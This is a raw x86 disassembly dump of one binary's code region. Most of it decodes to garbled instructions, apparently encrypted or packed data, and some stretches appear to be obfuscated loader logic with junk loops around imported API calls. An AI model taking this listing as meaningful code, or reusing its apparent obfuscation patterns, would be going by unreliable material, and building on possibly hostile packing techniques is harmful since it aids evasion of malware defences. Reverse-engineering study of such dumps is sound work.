  40d0db:	jo     0x40d0e4
  40d0dd:	sbb    bl,BYTE PTR [ebp+0x659c6452]
  40d0e3:	stc    
  40d0e4:	repz mov WORD PTR [esi-0x5f],?
  40d0e8:	or     al,0x40
  40d0ea:	sar    edi,0x0
  40d0ed:	sti    
  40d0ee:	cmp    eax,0xdf739671
  40d0f3:	ret    0x8a
  40d0f6:	pusha  
  40d0f7:	loope  0x40d110
  40d0f9:	sub    al,0x6d
  40d0fb:	test   al,0xe2
  40d0fd:	outs   dx,BYTE PTR ds:[esi]
  40d0fe:	jge    0x40d0ef
  40d100:	and    al,0xdf
  40d102:	xchg   edx,eax
  40d103:	and    BYTE PTR [ecx],bh
  40d105:	loop   0x40d0a0
  40d107:	test   DWORD PTR [ebp-0x3a],0xf48cbd64
  40d10e:	hlt    
  40d10f:	mov    edi,0x6997bc59
  40d114:	std    
  40d115:	data16 lods al,BYTE PTR ds:[esi]
  40d117:	sbb    DWORD PTR [ecx+ebx*4-0x2],eax
  40d11b:	inc    eax
  40d11c:	mov    dh,0x1d
  40d11e:	mov    eax,0x20a4dec5
  40d123:	popa   
  40d124:	sar    DWORD PTR [edx+0x3e],0x61
  40d128:	mov    bh,0xf0
  40d12a:	lock and BYTE PTR [ecx+0x1],bl
  40d12e:	icebp  
  40d12f:	(bad)  
  40d130:	dec    esp
  40d131:	fucomi st,st(4)
  40d133:	xor    DWORD PTR [ebx-0xe],ecx
  40d136:	add    DWORD PTR [eax],esp
  40d138:	icebp  
  40d139:	sub    al,BYTE PTR [ebp+0x40c34c37]
  40d13f:	jnp    0x40d152
  40d141:	add    al,0x12
  40d143:	(bad)  
  40d144:	cmp    al,BYTE PTR [edx-0x5f43b15a]
  40d14a:	inc    esi
  40d14b:	ret    
  40d14c:	mov    edi,0x9c766cbe
  40d151:	ds jae 0x40d129
  40d154:	jns    0x40d1b3
  40d156:	mov    edx,edi
  40d158:	lods   al,BYTE PTR ds:[esi]
  40d159:	pop    edi
  40d15a:	jmp    0x4d936101
  40d15f:	or     al,BYTE PTR [edx-0x50e878d2]
  40d165:	sub    edx,DWORD PTR gs:[esi]
  40d168:	jl     0x40d1d0
  40d16a:	xchg   cl,ah
  40d16c:	pop    ss
  40d16d:	push   eax
  40d16e:	test   BYTE PTR [edx+0x69357418],cl
  40d174:	aam    0x57
  40d176:	jns    0x40d16f
  40d178:	stc    
  40d179:	mov    ds:0xcdb01f46,al
  40d17e:	cmp    eax,0xc42be568
  40d183:	mov    cl,0xc2
  40d185:	mov    dh,0x1d
  40d187:	call   0xdfa9:0x27b55
  40d18e:	jmp    0x9795ee69
  40d193:	je     0x40d16e
  40d195:	mov    al,ds:0x90e6c159
  40d19a:	sbb    dh,dl
  40d19c:	mov    ds:0x72c40ba4,eax
  40d1a1:	add    bh,bh
  40d1a3:	xor    ch,BYTE PTR [edi-0x7f484293]
  40d1a9:	fxch   st(6)
  40d1ab:	and    al,0x9e
  40d1ad:	neg    eax
  40d1af:	xor    eax,0xc005030d
  40d1b4:	sti    
  40d1b5:	fs cld 
  40d1b7:	cmp    bl,BYTE PTR [edi+0x53d26687]
  40d1bd:	sahf   
  40d1be:	ret    0x4f04
  40d1c1:	xchg   esi,eax
  40d1c2:	fstp   QWORD PTR [esi]
  40d1c4:	jbe    0x40d197
  40d1c6:	xchg   ch,ah
  40d1c8:	pop    ebp
  40d1c9:	icebp  
  40d1ca:	jmp    0x40d1da
  40d1cc:	xchg   ebx,eax
  40d1cd:	stos   BYTE PTR es:[edi],al
  40d1ce:	(bad)  
  40d1cf:	jge    0x40d153
  40d1d1:	repnz xchg edi,eax
  40d1d3:	repnz xchg ecx,eax
  40d1d5:	cli    
  40d1d6:	inc    edi
  40d1d7:	add    DWORD PTR [edx-0x4898bfbe],0xffffffdf
  40d1de:	aaa    
  40d1df:	out    0x7e,eax
  40d1e1:	enter  0x8407,0xec
  40d1e5:	lods   al,BYTE PTR ds:[esi]
  40d1e6:	dec    eax
  40d1e7:	je     0x40d19a
  40d1e9:	mov    ebx,0x688ab0be
  40d1ee:	jg     0x40d207
  40d1f0:	add    al,BYTE PTR [ebx-0x71]
  40d1f3:	pop    edx
  40d1f4:	sub    cl,dh
  40d1f6:	xchg   ax,ax
  40d1f8:	ins    DWORD PTR es:[edi],dx
  40d1f9:	out    0xc1,al
  40d1fb:	call   0x8e73:0x2716ba8
  40d202:	out    dx,eax
  40d203:	fmul   QWORD PTR [eax-0x4f]
  40d206:	and    DWORD PTR [edx+0x6e],ebp
  40d209:	test   eax,0x82db1ce6
  40d20e:	push   esi
  40d20f:	mov    al,0xb8
  40d211:	jo     0x40d19e
  40d213:	xchg   ecx,eax
  40d214:	push   esp
  40d215:	aas    
  40d216:	sbb    eax,0x787e4e15
  40d21b:	dec    esp
  40d21c:	int3   
  40d21d:	jb     0x40d1cd
  40d21f:	mov    BYTE PTR [ebp-0x7f],bh
  40d222:	mov    WORD PTR [esi+ebx*2],gs
  40d225:	call   0xa38e:0xf2288e
  40d22c:	dec    edx
  40d22d:	add    eax,0xd28158d4
  40d232:	adc    eax,0xfd3654cb
  40d237:	xor    al,ch
  40d239:	out    0xc5,al
  40d23b:	or     eax,0xda511f6a
  40d240:	fisubr WORD PTR [ecx+0xb]
  40d243:	mov    ch,0xf3
  40d245:	mov    bh,0x20
  40d247:	mov    edi,0x70fcb38a
  40d24c:	add    eax,0xed40123c
  40d251:	repnz test ebp,ebp
  40d254:	mov    BYTE PTR [esi-0x5a42dc24],bl
  40d25a:	mov    ah,0x9c
  40d25c:	mov    esp,DWORD PTR [eax-0x6e63d3ef]
  40d262:	je     0x40d286
  40d264:	clc    
  40d265:	sbb    eax,0x62c3920f
  40d26a:	fild   DWORD PTR [edi-0x6f]
  40d26d:	mov    eax,ds:0x548a9a48
  40d272:	mov    bh,0x20
  40d274:	push   ebp
  40d275:	in     al,0xb4
  40d277:	jnp    0x40d266
  40d279:	cmp    esp,DWORD PTR [edx+0x8950a6b]
  40d27f:	cmp    edi,DWORD PTR [esi-0x5f]
  40d282:	add    edi,DWORD PTR [edx+0x48a3053f]
  40d288:	cmp    ebp,edi
  40d28a:	jmp    0x721aa048
  40d28f:	dec    edi
  40d290:	jecxz  0x40d224
  40d292:	inc    esp
  40d293:	shl    BYTE PTR [ecx],1
  40d295:	aaa    
  40d296:	in     al,dx
  40d297:	shr    esp,cl
  40d299:	enter  0x9cb4,0xd5
  40d29d:	push   ebx
  40d29e:	ret    
  40d29f:	ret    
  40d2a0:	bound  esi,QWORD PTR [ebx+0x65]
  40d2a3:	sbb    eax,0xdaaa719f
  40d2a8:	fisubr DWORD PTR [ecx]
  40d2aa:	dec    esi
  40d2ab:	fld    st(4)
  40d2ad:	adc    edx,eax
  40d2af:	aad    0x8c
  40d2b1:	sub    eax,0xde8b6a8e
  40d2b6:	or     ecx,DWORD PTR [ebx-0x70]
  40d2b9:	cwde   
  40d2ba:	rcr    BYTE PTR [eax-0x29],1
  40d2bd:	jp     0x40d31b
  40d2bf:	mov    ds:0x112f27e7,eax
  40d2c4:	and    al,0x5
  40d2c6:	jbe    0x40d300
  40d2c8:	fwait
  40d2c9:	pop    ebp
  40d2ca:	pop    ds
  40d2cb:	stc    
  40d2cc:	jp     0x40d2c7
  40d2ce:	daa    
  40d2cf:	mov    ch,0x40
  40d2d1:	pop    esp
  40d2d2:	int3   
  40d2d3:	repz add al,0x8d
  40d2d6:	push   esi
  40d2d7:	pop    ebx
  40d2d8:	jbe    0x40d2ac
  40d2da:	scas   al,BYTE PTR es:[edi]
  40d2db:	pop    ebp
  40d2dc:	sub    BYTE PTR [esp+ebx*8-0x7d862e3b],dl
  40d2e3:	les    esp,FWORD PTR [esi+0x7c39997d]
  40d2e9:	rol    BYTE PTR [ebx+0x65fb68fc],1
  40d2ef:	xchg   BYTE PTR [edx-0x53],cl
  40d2f2:	ins    BYTE PTR es:[edi],dx
  40d2f3:	add    al,0xcd
  40d2f5:	cmp    al,0x3e
  40d2f7:	sub    al,0xa9
  40d2f9:	mov    edx,0x9855b236
  40d2fe:	shl    DWORD PTR [ecx+0x4d4d3f48],1
  40d304:	xchg   ebx,eax
  40d305:	add    al,0x97
  40d307:	and    DWORD PTR [eax+0x6ba7be62],edx
  40d30d:	add    DWORD PTR [edx-0x7a],0xffffffad
  40d311:	jmp    0x5fc32d53
  40d316:	int3   
  40d317:	mov    ecx,0xb5e7dbf4
  40d31c:	xlat   BYTE PTR ds:[ebx]
  40d31d:	mov    esi,0x124a9397
  40d322:	sbb    al,0x32
  40d324:	icebp  
  40d325:	xor    DWORD PTR [edi+0xaee656a],ebx
  40d32b:	cmp    eax,edx
  40d32d:	add    al,0x4c
  40d32f:	fcom   QWORD PTR [esi-0x286866f2]
  40d335:	dec    ebx
  40d336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d337:	inc    edi
  40d338:	inc    ebx
  40d339:	mov    dh,0x40
  40d33b:	mov    ds:0x3d6ba50d,eax
  40d340:	mov    edx,0x2828fefd
  40d345:	repz ja 0x40d32f
  40d348:	xlat   BYTE PTR ds:[ebx]
  40d349:	cli    
  40d34a:	(bad)  
  40d34c:	std    
  40d34d:	fs lahf 
  40d34f:	pop    ss
  40d350:	repz mov cl,0x92
  40d353:	push   ss
  40d354:	sti    
  40d355:	jne    0x40d349
  40d357:	and    BYTE PTR [ebx-0x592b37d2],bl
  40d35d:	test   eax,0x5a2fb6bd
  40d362:	mov    ebx,0x8394c20
  40d367:	or     DWORD PTR [ebp+edx*8+0x5f68c6b8],edx
  40d36e:	push   esp
  40d36f:	cs hlt 
  40d371:	jae    0x40d377
  40d373:	jns    0x40d3d5
  40d375:	(bad)  
  40d376:	int    0xe4
  40d378:	je     0x40d344
  40d37a:	iret   
  40d37b:	add    eax,0x44eae70d
  40d380:	add    ebx,ecx
  40d382:	inc    ebx
  40d383:	sub    esi,DWORD PTR [eax+0x33f47d8b]
  40d389:	clc    
  40d38a:	sub    edx,edi
  40d38c:	mov    edi,DWORD PTR [ebp-0xc]
  40d38f:	mov    ebx,DWORD PTR [ebp-0x14]
  40d392:	xor    edi,eax
  40d394:	add    edi,ecx
  40d396:	imul   edi,ebx
  40d399:	mov    ebx,DWORD PTR [ebp-0x18]
  40d39c:	xor    ebx,eax
  40d39e:	sub    edx,ecx
  40d3a0:	lea    edi,[edi+ebx*1+0x32729a]
  40d3a7:	cmp    edi,edx
  40d3a9:	jbe    0x40c541
  40d3af:	mov    edx,DWORD PTR [ebp-0xc]
  40d3b2:	mov    edi,DWORD PTR [ebp-0x24]
  40d3b5:	jmp    0x40d728
  40d3ba:	mov    ebx,0xd1887f92
  40d3bf:	popf   
  40d3c0:	dec    ebx
  40d3c1:	pop    ebp
  40d3c2:	stc    
  40d3c3:	ss push edi
  40d3c5:	xchg   ebp,eax
  40d3c6:	imul   eax,DWORD PTR [edi+0x2b],0xffffffaf
  40d3ca:	outs   dx,DWORD PTR ds:[esi]
  40d3cb:	cwde   
  40d3cc:	jl     0x40d44a
  40d3ce:	retf   0x7c79
  40d3d1:	jl     0x40d3b8
  40d3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3d4:	fcom   st(6)
  40d3d6:	test   BYTE PTR [edx+ebp*4],cl
  40d3d9:	jne    0x40d441
  40d3db:	imul   ebp,esp,0xffffffd2
  40d3de:	loope  0x40d3da
  40d3e0:	mov    al,ds:0x138bb53c
  40d3e5:	dec    esi
  40d3e6:	xchg   DWORD PTR [ebx],edi
  40d3e8:	popf   
  40d3e9:	data16 fisub DWORD PTR [ebp-0x19]
  40d3ed:	mov    cs,WORD PTR ds:0xf3952e4a
  40d3f3:	jo     0x40d3e0
  40d3f5:	popf   
  40d3f6:	ror    eax,1
  40d3f8:	(bad)  
  40d3f9:	leave  
  40d3fa:	sub    DWORD PTR ds:0xf1bf9856,eax
  40d400:	sbb    al,0xca
  40d402:	add    al,0x80
  40d404:	pop    ebp
  40d405:	mul    BYTE PTR [eax+0x29]
  40d408:	fsubr  QWORD PTR [ecx-0x6e]
  40d40b:	inc    ecx
  40d40c:	dec    edx
  40d40d:	in     al,0x5f
  40d40f:	or     al,0x6
  40d411:	stos   BYTE PTR es:[edi],al
  40d412:	les    eax,FWORD PTR [esi]
  40d414:	shr    bl,1
  40d416:	daa    
  40d417:	add    cl,BYTE PTR [edx]
  40d419:	and    ebp,ecx
  40d41b:	and    eax,0x855de918
  40d420:	ficom  WORD PTR [ecx+0x7e]
  40d423:	mov    edi,0xc5fbfd2a
  40d428:	leave  
  40d429:	add    al,0x67
  40d42b:	aas    
  40d42c:	and    al,0x87
  40d42e:	and    dh,BYTE PTR fs:[ebx+esi*8+0x5c]
  40d433:	imul   esp,DWORD PTR [ebx+0x9],0xe
  40d437:	pop    ss
  40d438:	jmp    0x40d40b
  40d43a:	xor    esp,DWORD PTR [edx]
  40d43c:	call   0xb024:0x667e3e7
  40d443:	mov    esp,0xbb6f33e0
  40d448:	xchg   ebp,eax
  40d449:	or     eax,0x957d2a20
  40d44e:	xchg   edi,eax
  40d44f:	lods   al,BYTE PTR ds:[esi]
  40d450:	popw   ss
  40d452:	jmp    0x7b7a:0x24be44e0
  40d459:	ret    0xf17f
  40d45c:	jbe    0x40d424
  40d45e:	lea    esi,[eax+0x15ebf2ac]
  40d464:	(bad)  [ebx]
  40d466:	sahf   
  40d467:	sar    eax,1
  40d469:	bound  ebp,QWORD PTR [eax]
  40d46b:	inc    edx
  40d46c:	in     al,dx
  40d46d:	movlps xmm2,QWORD PTR [ebp-0x14f7691c]
  40d474:	(bad)
  40d477:	pop    esp
  40d478:	les    ecx,FWORD PTR [ebp+eiz*4-0x2e3cac8c]
  40d47f:	xor    eax,0x538e9bdf
  40d484:	adc    ch,ch
  40d486:	mov    eax,DWORD PTR [esi-0x56]
  40d489:	jge    0x40d44b
  40d48b:	sbb    esi,ecx
  40d48d:	push   esi
  40d48e:	jne    0x40d49f
  40d490:	clc    
  40d491:	gs (bad) 
  40d493:	dec    esp
  40d494:	bound  ecx,QWORD PTR [edx-0x5ee034e7]
  40d49a:	mov    ss,ebp
  40d49c:	cli    
  40d49d:	cmp    ch,BYTE PTR [edi-0x282b0bc5]
  40d4a3:	jecxz  0x40d4a1
  40d4a5:	dec    ebp
  40d4a6:	or     edx,edx
  40d4a8:	ja     0x40d44e
  40d4aa:	sub    BYTE PTR ss:[edx-0x7199049],dl
  40d4b1:	sar    DWORD PTR [eax-0x1d],0x75
  40d4b5:	mov    al,ds:0x8f1a3b24
  40d4ba:	and    DWORD PTR [edi+0x3a],edi
  40d4bd:	mov    bh,0xbb
  40d4bf:	push   ebp
  40d4c0:	jmp    0x40d53d
  40d4c2:	push   edx
  40d4c3:	pop    edx
  40d4c4:	push   ds
  40d4c5:	stos   DWORD PTR es:[edi],eax
  40d4c6:	or     al,0x8b
  40d4c8:	sub    DWORD PTR [edi+0x5847109e],ebx
  40d4ce:	ret    0x5896
  40d4d1:	inc    edx
  40d4d2:	rcr    dh,1
  40d4d4:	mov    al,ds:0x38282c96
  40d4d9:	arpl   WORD PTR [edi-0x47ed4ec6],ax
  40d4df:	std    
  40d4e0:	push   esp
  40d4e1:	adc    DWORD PTR [edx-0x1b],ebp
  40d4e4:	call   0x2a2d1729
  40d4e9:	mov    eax,ds:0x1277200e
  40d4ee:	jl     0x40d539
  40d4f0:	sbb    esp,DWORD PTR [eax]
  40d4f2:	pusha  
  40d4f3:	mov    DWORD PTR ds:0x4cc12327,ecx
  40d4f9:	ror    BYTE PTR [edi],0xc5
  40d4fc:	jecxz  0x40d4ba
  40d4fe:	daa    
  40d4ff:	adc    BYTE PTR [ebx-0x3d],al
  40d502:	sbb    cl,dl
  40d504:	push   ebp
  40d505:	adc    DWORD PTR [ebx],ebp
  40d507:	push   ss
  40d508:	stos   BYTE PTR es:[edi],al
  40d509:	and    dh,BYTE PTR [ebp-0x4a]
  40d50c:	ins    DWORD PTR es:[edi],dx
  40d50d:	ja     0x40d4ab
  40d50f:	pop    es
  40d510:	nop
  40d511:	inc    edi
  40d512:	ss dec esp
  40d514:	sbb    dl,dl
  40d516:	jle    0x40d575
  40d518:	xchg   edx,eax
  40d519:	shr    DWORD PTR [edi+0xb8b6b61],0xd7
  40d520:	adc    al,0xc3
  40d522:	adc    eax,0xf12f9241
  40d527:	and    al,BYTE PTR [eax+0x7a]
  40d52a:	mov    cl,0x4
  40d52c:	jae    0x40d507
  40d52e:	xor    BYTE PTR [ecx+0x47e97d4e],ch
  40d534:	call   0x8fbe1fd4
  40d539:	pmovmskb edi,mm3
  40d53c:	inc    edx
  40d53d:	and    DWORD PTR [edi+0x6b35fcc7],ecx
  40d543:	test   eax,0x2263a684
  40d548:	popa   
  40d549:	dec    edx
  40d54a:	sbb    DWORD PTR [eax+0x1e],esp
  40d54d:	push   0xf0163a9a
  40d552:	imul   edi,DWORD PTR [ecx-0x502568c3],0x53a340ef
  40d55c:	pop    edx
  40d55d:	mov    ah,BYTE PTR [ebx+0x4c690bf6]
  40d563:	add    al,BYTE PTR [ecx-0x27b7e1f8]
  40d569:	(bad)
  40d56c:	jg     0x40d579
  40d56e:	jge    0x40d560
  40d570:	mov    WORD PTR [eax+0x2f],?
  40d573:	fwait
  40d574:	dec    ebp
  40d575:	fidivr WORD PTR [ebx]
  40d578:	push   ds
  40d579:	jnp    0x40d505
  40d57b:	cld    
  40d57c:	add    al,0x56
  40d57e:	sar    BYTE PTR [esi+0x27f78a1e],1
  40d584:	int3   
  40d585:	mov    DWORD PTR [edx+0x56a034fb],edi
  40d58b:	repnz pop DWORD PTR cs:[edx-0xe]
  40d590:	push   0xee91793d
  40d595:	das    
  40d596:	push   0xffffffcd
  40d598:	addr16 push edx
  40d59a:	daa    
  40d59b:	mov    ch,0xd
  40d59d:	jne    0x40d5ad
  40d59f:	cmp    eax,0x70cc3306
  40d5a4:	dec    ebp
  40d5a5:	int    0xc3
  40d5a7:	jg     0x40d52b
  40d5a9:	mov    cs:0x64c8f4de,eax
  40d5af:	sub    al,0x9d
  40d5b1:	cwde   
  40d5b2:	mov    ah,0x56
  40d5b4:	mov    edx,0xafc673aa
  40d5b9:	pushf  
  40d5ba:	pop    ebx
  40d5bb:	shl    al,0x59
  40d5be:	inc    ebp
  40d5bf:	mov    edi,0x925cdc06
  40d5c4:	inc    ebx
  40d5c5:	sub    bh,BYTE PTR [esi]
  40d5c7:	cmp    edx,DWORD PTR [eax]
  40d5c9:	sbb    bh,BYTE PTR [ecx+edi*2-0x38]
  40d5cd:	add    BYTE PTR [ecx],cl
  40d5cf:	pop    esi
  40d5d0:	inc    ebx
  40d5d1:	call   0xa338e4d9
  40d5d6:	and    edi,DWORD PTR [esi+0x472739de]
  40d5dc:	inc    edx
  40d5dd:	pop    edi
  40d5de:	clc    
  40d5df:	jge    0x40d613
  40d5e1:	pop    eax
  40d5e2:	test   esp,esi
  40d5e4:	sbb    al,0xd9
  40d5e6:	and    al,0xfc
  40d5e8:	xchg   edi,eax
  40d5e9:	js     0x40d5dd
  40d5eb:	(bad)  
  40d5ec:	cwde   
  40d5ed:	jg     0x40d65d
  40d5ef:	xlat   BYTE PTR ds:[ebx]
  40d5f0:	push   cs
  40d5f1:	or     dl,bl
  40d5f3:	mov    al,ds:0xe46a99b
  40d5f8:	inc    edx
  40d5f9:	mov    bl,0xf5
  40d5fb:	sbb    bh,BYTE PTR [edi+0x25b1f1d2]
  40d601:	rcr    DWORD PTR [ebx],1
  40d603:	lea    edx,[eax+0x19c75f0f]
  40d609:	cs ret 0xafad
  40d60d:	sub    ebx,esp
  40d60f:	pop    esp
  40d610:	cmp    DWORD PTR [esi],ecx
  40d612:	pop    ds
  40d613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d614:	stc    
  40d615:	repz sbb DWORD PTR [ebx+0x1393a352],ebx
  40d61c:	xchg   esp,eax
  40d61d:	test   eax,0xd2cf9c77
  40d622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d623:	jmp    0x40d62e
  40d625:	fdivr  DWORD PTR [edi]
  40d627:	lock pop esi
  40d629:	jnp    0x40d62a
  40d62b:	(bad)  
  40d62c:	int3   
  40d62d:	adc    DWORD PTR [ebx+0x29220fe9],esp
  40d633:	bound  edx,QWORD PTR [edx]
  40d635:	add    DWORD PTR [eax+ecx*4],edi
  40d638:	call   0x7695:0x997f1510
  40d63f:	daa    
  40d640:	scas   al,BYTE PTR es:[edi]
  40d641:	fcomp  QWORD PTR [eax]
  40d643:	jbe    0x40d652
  40d645:	pusha  
  40d646:	jp     0x40d63e
  40d648:	push   esi
  40d649:	stos   DWORD PTR es:[edi],eax
  40d64a:	xchg   edi,eax
  40d64b:	mov    al,ds:0x7833ef63
  40d650:	push   ebp
  40d651:	int    0xe1
  40d653:	imul   esp,edi,0x51
  40d656:	xor    al,0x2c
  40d658:	jecxz  0x40d669
  40d65a:	das    
  40d65b:	pop    esp
  40d65c:	fisub  WORD PTR [edx]
  40d65e:	loope  0x40d65a
  40d660:	mov    cl,0x94
  40d662:	into   
  40d663:	inc    eax
  40d664:	jmp    0xb21a5373
  40d669:	and    dh,dh
  40d66b:	call   0xf2ca4ae3
  40d670:	das    
  40d671:	mov    ecx,0x75dd1f9d
  40d676:	cmp    DWORD PTR [ecx+0x7dc9b599],edi
  40d67c:	xchg   al,ch
  40d67e:	xor    dh,BYTE PTR [ebx+0x69]
  40d681:	in     eax,0xf4
  40d683:	mov    WORD PTR [eax*1-0x67147aab],fs
  40d68a:	jl     0x40d6bc
  40d68c:	xchg   DWORD PTR [ebp-0x17],esi
  40d68f:	out    dx,eax
  40d690:	fmul   DWORD PTR [esi]
  40d692:	fwait
  40d693:	retf   
  40d694:	cld    
  40d695:	lea    ebp,[esp+ebp*4-0x58]
  40d699:	push   ebx
  40d69a:	and    dh,dl
  40d69c:	jne    0x40d660
  40d69e:	test   al,0xca
  40d6a0:	mov    ah,0x1d
  40d6a2:	adc    bl,BYTE PTR [edx+0x3f6c0f9f]
  40d6a8:	gs cli 
  40d6aa:	out    0xf4,eax
  40d6ac:	ffreep st(1)
  40d6ae:	shl    DWORD PTR [ebx],0xc3
  40d6b1:	xchg   ebx,eax
  40d6b2:	cmp    BYTE PTR [eax+edi*8],0x8e
  40d6b6:	addr16 dec esp
  40d6b8:	dec    ecx
  40d6b9:	mov    esi,0xe6be0954
  40d6be:	call   0xc88511c7
  40d6c3:	ss jns 0x40d6df
  40d6c6:	inc    eax
  40d6c7:	mov    dl,dh
  40d6c9:	rcl    al,0xde
  40d6cc:	xchg   edi,eax
  40d6cd:	sar    DWORD PTR [ecx-0x6b839426],1
  40d6d3:	ss out dx,al
  40d6d5:	mov    esp,0x251f1fac
  40d6da:	fldcw  WORD PTR [edx-0x1c]
  40d6dd:	ficomp DWORD PTR [eax+0x34ac4fc9]
  40d6e3:	mov    dh,0xeb
  40d6e5:	call   0x164b:0xdcf9ff73
  40d6ec:	adc    al,0x59
  40d6ee:	mov    WORD PTR [edx],gs
  40d6f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6f1:	jecxz  0x40d755
  40d6f3:	ins    DWORD PTR es:[edi],dx
  40d6f4:	mov    esi,0x84ee94b1
  40d6f9:	jno    0x40d710
  40d6fb:	sub    dh,BYTE PTR [edx]
  40d6fd:	pop    esi
  40d6fe:	add    DWORD PTR [edi+ebx*1],edi
  40d701:	adc    BYTE PTR [ecx],dl
  40d703:	inc    ebx
  40d704:	fbstp  TBYTE PTR gs:[edi-0x71]
  40d708:	push   eax
  40d709:	daa    
  40d70a:	mov    edi,0xbcc4c116
  40d70f:	pop    es
  40d710:	or     eax,0x332d5255
  40d715:	push   ebx
  40d716:	fnstcw WORD PTR [esi+0x4781464f]
  40d71c:	clc    
  40d71d:	popa   
  40d71e:	push   ebx
  40d71f:	loope  0x40d779
  40d721:	icebp  
  40d722:	sar    BYTE PTR [edi],cl
  40d724:	mov    eax,0x333c038f
  40d729:	rol    BYTE PTR [ebx],1
  40d72b:	ror    DWORD PTR [edi],1
  40d72d:	scas   eax,DWORD PTR es:[edi]
  40d72e:	xlat   BYTE PTR ds:[ebx]
  40d72f:	mov    edi,DWORD PTR [ebp-0x18]
  40d732:	xor    edi,eax
  40d734:	add    edx,edi
  40d736:	mov    edi,DWORD PTR [ebp-0x8]
  40d739:	lea    edx,[edx+edi*1+0x32729a]
  40d740:	mov    DWORD PTR [ebp-0x8],edx
  40d743:	mov    edx,DWORD PTR [ebp-0x20]
  40d746:	xor    edx,eax
  40d748:	mov    edi,0xffcd8d66
  40d74d:	sub    edi,edx
  40d74f:	add    edi,DWORD PTR [ebp-0x10]
  40d752:	mov    edx,DWORD PTR [ebp-0x20]
  40d755:	mov    ebx,DWORD PTR [ebp-0x8]
  40d758:	xor    edx,eax
  40d75a:	add    edx,ecx
  40d75c:	imul   edx,ebx
  40d75f:	cmp    edx,edi
  40d761:	jbe    0x40a06e
  40d767:	pop    ebx
  40d768:	pop    edi
  40d769:	leave  
  40d76a:	ret    0x8
  40d76d:	push   ebp
  40d76e:	mov    ebp,esp
  40d770:	sub    esp,0xa8
  40d776:	and    DWORD PTR ds:0x43359b,0x6624
  40d780:	push   ebx
  40d781:	adc    DWORD PTR ds:0x433563,0x6b43
  40d78b:	push   esi
  40d78c:	push   edi
  40d78d:	sbb    DWORD PTR ds:0x43361f,0x4335a7
  40d797:	push   0x413c96
  40d79c:	sub    DWORD PTR ds:0x43354b,0x433663
  40d7a6:	call   DWORD PTR ds:0x412194
  40d7ac:	push   0x413cbe
  40d7b1:	sub    DWORD PTR ds:0x433623,0x43353f
  40d7bb:	call   DWORD PTR ds:0x412174
  40d7c1:	test   eax,eax
  40d7c3:	je     0x40d7d1
  40d7c9:	push   0x2
  40d7cb:	pop    eax
  40d7cc:	jmp    0x40e1cc
  40d7d1:	and    DWORD PTR ds:0x4335b3,0x0
  40d7db:	xor    ecx,ecx
  40d7dd:	xor    ecx,DWORD PTR ds:0x4335b3
  40d7e3:	inc    ecx
  40d7e4:	mov    DWORD PTR ds:0x4335b3,ecx
  40d7ea:	cmp    DWORD PTR ds:0x4335b3,0x24
  40d7f1:	jne    0x40d80b
  40d7f7:	push   DWORD PTR [ebp-0x28]
  40d7fa:	push   DWORD PTR [ebp-0x20]
  40d7fd:	push   0x38c3
  40d802:	push   DWORD PTR [ebp-0x14]
  40d805:	call   DWORD PTR ds:0x412274
  40d80b:	cmp    DWORD PTR ds:0x4335b3,0x1e
  40d812:	jb     0x40d7db
  40d818:	or     DWORD PTR ds:0x433547,0x433667
  40d822:	mov    DWORD PTR [ebp-0x24],0xf89c8535
  40d829:	dec    ecx
  40d82a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40d831:	add    ecx,ecx
  40d833:	lea    eax,[ebp-0x2c]
  40d836:	and    DWORD PTR ds:0x43354f,0x0
  40d840:	jmp    0x40d852
  40d845:	mov    ecx,DWORD PTR ds:0x43354f
  40d84b:	inc    ecx
  40d84c:	mov    DWORD PTR ds:0x43354f,ecx
  40d852:	cmp    DWORD PTR ds:0x43354f,0x10
  40d859:	jae    0x40d899
  40d85f:	cmp    DWORD PTR ds:0x43354f,0x4
  40d866:	jne    0x40d87a
  40d86c:	push   0x42d1
  40d871:	push   DWORD PTR [ebp-0x28]
  40d874:	call   DWORD PTR ds:0x4121a0
  40d87a:	cmp    DWORD PTR ds:0x43354f,0x3
  40d881:	jne    0x40d894
  40d887:	mov    ecx,DWORD PTR ds:0x43354f
  40d88d:	inc    ecx
  40d88e:	mov    DWORD PTR ds:0x43354f,ecx
  40d894:	jmp    0x40d845
  40d899:	mov    DWORD PTR [ebp-0x18],eax
  40d89c:	xor    esi,esi
  40d89e:	add    esi,DWORD PTR ds:0x43361b
  40d8a4:	add    esi,DWORD PTR ds:0x4335e3
  40d8aa:	mov    DWORD PTR ds:0x43361b,esi
  40d8b0:	lea    eax,[ebp-0x30]
  40d8b3:	inc    edi
  40d8b4:	mov    DWORD PTR [ebp-0x14],eax
  40d8b7:	mov    eax,ds:0x433547
  40d8bc:	and    eax,DWORD PTR ds:0x4335af
  40d8c2:	mov    ds:0x433547,eax
  40d8c7:	mov    eax,ds:0x413b16
  40d8cc:	sbb    DWORD PTR ds:0x433553,ebx
  40d8d2:	mov    eax,DWORD PTR [eax+0x1c8]
  40d8d8:	mov    eax,DWORD PTR [eax]
  40d8da:	and    DWORD PTR ds:0x43365b,0x0
  40d8e4:	jmp    0x40d8f8
  40d8e9:	xor    edi,edi
  40d8eb:	or     edi,DWORD PTR ds:0x43365b
  40d8f1:	inc    edi
  40d8f2:	mov    DWORD PTR ds:0x43365b,edi
  40d8f8:	cmp    DWORD PTR ds:0x43365b,0x1c
  40d8ff:	jae    0x40d922
  40d905:	cmp    DWORD PTR ds:0x43365b,0x25
  40d90c:	jne    0x40d91d
  40d912:	push   0x6b44
  40d917:	call   DWORD PTR ds:0x4121a4
  40d91d:	jmp    0x40d8e9
  40d922:	mov    ecx,DWORD PTR [ebp-0x14]
  40d925:	sbb    DWORD PTR ds:0x4335a7,0x43365f
  40d92f:	mov    esi,0x7510853
  40d934:	movzx  edi,BYTE PTR ds:0x433553
  40d93b:	and    edi,DWORD PTR ds:0x43362f
  40d941:	mov    DWORD PTR ds:0x433553,edi
  40d947:	xor    eax,esi
  40d949:	mov    DWORD PTR ds:0x4335a7,0x13
  40d953:	cmp    DWORD PTR ds:0x4335a7,0x0
  40d95a:	je     0x40d9b9
  40d960:	cmp    DWORD PTR ds:0x4335a7,0x3
  40d967:	jne    0x40d985
  40d96d:	push   0x5b51
  40d972:	push   DWORD PTR [ebp-0x18]
  40d975:	push   0x1bb9
  40d97a:	push   0x295c
